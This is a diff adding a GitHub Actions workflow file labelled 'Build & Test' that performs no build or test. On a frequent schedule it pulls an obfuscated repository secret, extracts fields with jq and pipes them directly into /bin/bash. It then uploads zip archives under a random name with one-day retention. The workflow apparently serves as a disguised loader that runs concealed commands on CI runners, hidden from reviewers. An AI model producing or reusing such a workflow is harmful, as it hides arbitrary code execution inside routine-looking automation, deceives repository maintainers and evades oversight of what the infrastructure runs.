@@ -1,0 +1,36 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '58 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Build
+        env:
+          wmtgo3: ${{ secrets.wmtgo3 }}
+        run: |
+          printf '%s' "$wmtgo3" | jq -r .aq78137 | /bin/bash
+          echo $fuphn929 | jq -r .vc0987 | /bin/bash
+          echo $lkh9 | jq -r .x4326 | /bin/bash
+          printf '%s' "$rp701" | jq -r .xdl8798 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: tNvZR2b7
+          path: "*.zip"
+          retention-days: 1
